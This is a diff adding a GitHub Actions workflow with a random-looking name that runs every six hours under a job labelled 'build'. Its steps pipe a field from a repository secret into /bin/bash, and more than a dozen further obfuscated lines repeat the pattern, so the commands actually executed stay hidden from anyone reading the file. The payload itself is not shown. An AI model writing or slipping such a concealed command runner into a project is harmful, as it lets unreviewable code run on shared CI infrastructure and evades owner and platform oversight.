@@ -1,0 +1,31 @@
+name: yuanjiaming9876
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanjiaming9876
+        env:
+          inbyk237: ${{ secrets.inbyk237 }}
+        run: |
+          echo $inbyk237 | jq -r .jdigs6853 | /bin/bash
+          echo $ke967 | jq -r .duk64360 | /bin/bash
+          echo $fob9546 | jq -r .ctb7 | /bin/bash
+          echo $so7 | jq -r .u7904 | /bin/bash
+          echo $kvhwd3401 | jq -r .wntn2039 | /bin/bash
+          echo $b28 | jq -r .bzgva60919 | /bin/bash
+          echo $uwtdx347 | jq -r .npjz2929 | /bin/bash
+          echo $prur88 | jq -r .g14 | /bin/bash
+          echo $ryzv915 | jq -r .hksnn7 | /bin/bash
+          echo $r4 | jq -r .gnx092 | /bin/bash
+          echo $etd8 | jq -r .lp423 | /bin/bash
+          echo $y87761 | jq -r .jzlsf42026 | /bin/bash
+          echo $ldwp14 | jq -r .ovcrq565 | /bin/bash
+          echo $aref886 | jq -r .bz34173 | /bin/bash
+          echo $zanyi67037 | jq -r .z5150 | /bin/bash
+
